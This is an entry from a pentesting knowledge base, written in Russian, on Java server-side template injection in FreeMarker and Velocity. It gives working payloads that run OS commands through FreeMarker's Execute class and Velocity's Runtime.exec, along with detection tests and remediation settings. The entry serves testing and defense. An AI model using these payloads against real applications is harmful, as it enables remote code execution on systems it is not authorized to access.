---
id: ssti-java-freemarker-reflection
title: "SSTI (Java): FreeMarker/Velocity к Runtime.exec"
type: ssti
target: java
category: web
difficulty: advanced
bypass: none
tags: [ssti, java, freemarker, velocity]
tested_on: ["FreeMarker 2.3.x", "Velocity 1.7"]
success_rate: 0.4
risk: high
cwe: "CWE-1336"
lab: null
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/server-side-template-injection"
graph:
  - target: "ssti"
    type: instance_of
  - target: "rce"
    type: leads_to
---

# SSTI (Java): FreeMarker/Velocity к Runtime.exec

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
${"freemarker.template.utility.Execute"?new()("id")}
```

## Explanation

FreeMarker позволяет создавать объекты через `?new()`, если включён `new_builtin_class_resolver`
в режиме `unrestricted` (по умолчанию в старых версиях). Классы
`freemarker.template.utility.Execute` и `ObjectConstructor` дают выполнение команд.
В Velocity аналог — обращение к `Class.forName(...)` через `$class.inspect(...)`
или `Runtime.getRuntime().exec()` при наличии `$runtime` в контексте.
Java-версии SSTI часто встречаются в генераторах отчётов и почтовых шаблонах.

## Detection

Маркеры Java-шаблонов: `${...}`, `#{...}`, `<#assign`, `$class`.
Тест: `${7*7}` -> `49`. Затем `${"x"?upper_case}` (FreeMarker) или `$class.type`
(Velocity) — подтверждает движок.

## Remediation

- FreeMarker: `cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)`.
- Velocity: `SecureUberspector`, убрать из контекста `Runtime`, `Class`, `System`.
- Не компилировать шаблоны из пользовательского ввода.
- Обновление библиотек; SecurityManager-подобные ограничения (в новых JVM — модули/политики).

## Variants

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
```
